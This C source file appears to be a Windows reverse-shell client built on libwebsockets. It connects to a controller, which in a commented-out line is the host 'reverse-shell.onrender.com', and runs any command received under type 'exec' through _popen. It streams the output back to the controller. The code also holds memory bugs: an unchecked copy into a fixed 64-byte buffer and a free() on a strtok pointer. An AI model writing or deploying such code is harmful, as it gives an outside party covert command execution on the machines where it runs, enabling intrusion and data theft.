#include <libwebsockets.h>
#include <string.h>
#include <signal.h>
#include <windows.h>
#include <lmcons.h>

#include "auth.h"
#include "tools.h"

char msg[512];
char* splitMsg = NULL;

int sentId = 0;

static int interrupted = 0;

static void sigint_handler(int sig) {
    interrupted = 1;
}

// Function to send a message
void send_message(struct lws *wsi, const char *value) {
    char msg_to_send[512];

    // Create the JSON message dynamically with the escaped value
    char json_msg[512];
    snprintf(json_msg, sizeof(json_msg), "%s", value);

    // Create the full message with the JSON message
    snprintf(msg_to_send, sizeof(msg_to_send), "{ \"type\": \"cmd\", \"value\": \"");
    strncat(msg_to_send, json_msg, sizeof(msg_to_send) - strlen(msg_to_send) - 1);
    strncat(msg_to_send, "\", \"to\": \"web\" }", sizeof(msg_to_send) - strlen(msg_to_send) - 1);

    // Allocate a buffer for the message with LWS_PRE bytes padding for the header
    size_t msg_len = strlen(msg_to_send);
    unsigned char buf[LWS_PRE + 512];
    memcpy(&buf[LWS_PRE], msg_to_send, msg_len);

    // Send the message
    printf("Sending: %s\n", msg_to_send);
    int bytes_sent = lws_write(wsi, &buf[LWS_PRE], msg_len, LWS_WRITE_BINARY);
    if (bytes_sent < (int)msg_len) {
        printf("Failed to send message completely\n");
    } else {
        printf("Message sent.\n");
    }
}

void execute(const char *command, struct lws *wsi) {
    char buffer[128];
    FILE *fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to run command\n");
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        // Escape the value to handle any special characters
        char *escaped_value = escape_json(buffer);
        if (!escaped_value) {
            return;  // Handle memory allocation failure
        }

        strncat(msg, escaped_value, sizeof(msg) - strlen(msg) - 1);
        strncat(msg, "\n", sizeof(msg) - strlen(msg) - 1);

        free(escaped_value);
    }
    splitMsg = strtok(msg, "\n");

    _pclose(fp);
}

void handle_message(const char *json_data, struct lws *wsi) {
    char type[16] = {0};  // Buffer for "type" value
    char value[64] = {0}; // Buffer for "value" value

    // Find the "type" key and extract the value
    const char *type_start = strstr(json_data, "\"type\":\"");
    if (type_start) {
        type_start += 8; // Move pointer past "\"type\":\""
        const char *type_end = strchr(type_start, '"');
        if (type_end) {
            size_t type_len = type_end - type_start;
            strncpy(type, type_start, type_len);
            type[type_len] = '\0'; // Null-terminate the string
        }
    }

    // Find the "value" key and extract the value
    const char *value_start = strstr(json_data, "\"value\":\"");
    if (value_start) {
        value_start += 9; // Move pointer past "\"value\":\""
        const char *value_end = strchr(value_start, '"');
        if (value_end) {
            size_t value_len = value_end - value_start;
            strncpy(value, value_start, value_len);
            value[value_len] = '\0'; // Null-terminate the string
        }
    }

    // Switch based on the "type" field
    if (strcmp(type, "msg") == 0) {
        printf("Received message: %s\n", value);
        // Handle "msg" type
    } else if (strcmp(type, "exec") == 0) {
        printf("Received exec: %s\n", value);
        // Handle "exec" type
        execute(value, wsi);
    } else {
        printf("Unknown type: %s\n", type);
    }
}

static int callback_echo(struct lws *wsi, enum lws_callback_reasons reason,
                         void *user, void *in, size_t len) {
    switch (reason) {
        case LWS_CALLBACK_CLIENT_ESTABLISHED:
            printf("Connected to server\n");
            lws_callback_on_writable(wsi); // Keep writable to send pings
            break;

        case LWS_CALLBACK_CLIENT_WRITEABLE: {
            if(!sentId){
                authenticate(wsi);
                sentId = 1;
            }

            if (splitMsg != NULL) {
                send_message(wsi, splitMsg);
                splitMsg = strtok(NULL, "\n");
            } else {
                msg[0] = '\0';
                free(splitMsg);
            }
            // printf("%s ; %s\n", msg, splitMsg);

            lws_callback_on_writable(wsi);
            break;
        }

        case LWS_CALLBACK_CLIENT_RECEIVE:
            printf("Received: %s\n", (const char *)in);
            handle_message((const char *)in, wsi);
            // Keep connection writable to avoid closing
            lws_callback_on_writable(wsi);
            break;

        case LWS_CALLBACK_CLIENT_CONNECTION_ERROR:
            printf("Connection error\n");
            exit(1);
            interrupted = 1;
            break;

        case LWS_CALLBACK_CLIENT_CLOSED:
            printf("Disconnected from server\n");
            exit(1);
            interrupted = 1;
            break;

        default:
            break;
    }
    return 0;
}

int establish_connection(){
    struct lws_context_creation_info info;
    struct lws_client_connect_info ccinfo;
    struct lws_context *context;
    // const char *url = "reverse-shell.onrender.com";
    // int port = 443;
    const char *url = "localhost";
    int port = 8080;

    memset(&info, 0, sizeof info);
    info.port = CONTEXT_PORT_NO_LISTEN;
    info.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
    info.protocols = (struct lws_protocols[]) {
        {"chat", callback_echo, 0, 0},
        {NULL, NULL, 0, 0}
    };

    // Enable debug logging
    lws_set_log_level(LLL_USER | LLL_ERR | LLL_WARN | LLL_NOTICE | LLL_INFO | LLL_DEBUG, NULL);

    context = lws_create_context(&info);
    if (!context) {
        printf("lws init failed\n");
        return 1;
    }

    memset(&ccinfo, 0, sizeof(ccinfo));
    ccinfo.context = context;
    ccinfo.address = url;
    ccinfo.port = port;
    ccinfo.path = "/";
    ccinfo.host = url;
    ccinfo.origin = url;
    ccinfo.protocol = "chat";
    //ccinfo.ssl_connection = LCCSCF_USE_SSL; // Enable SSL/TLS
    ccinfo.pwsi = NULL;

    signal(SIGINT, sigint_handler);

    if (!lws_client_connect_via_info(&ccinfo)) {
        printf("SSL Connection failed\n");
        lws_context_destroy(context);
        return 1;
    }

    while (!interrupted) {
        lws_service(context, 100);
    }

    lws_context_destroy(context);
}

int main() {
    establish_connection();
    
    return 0;
}
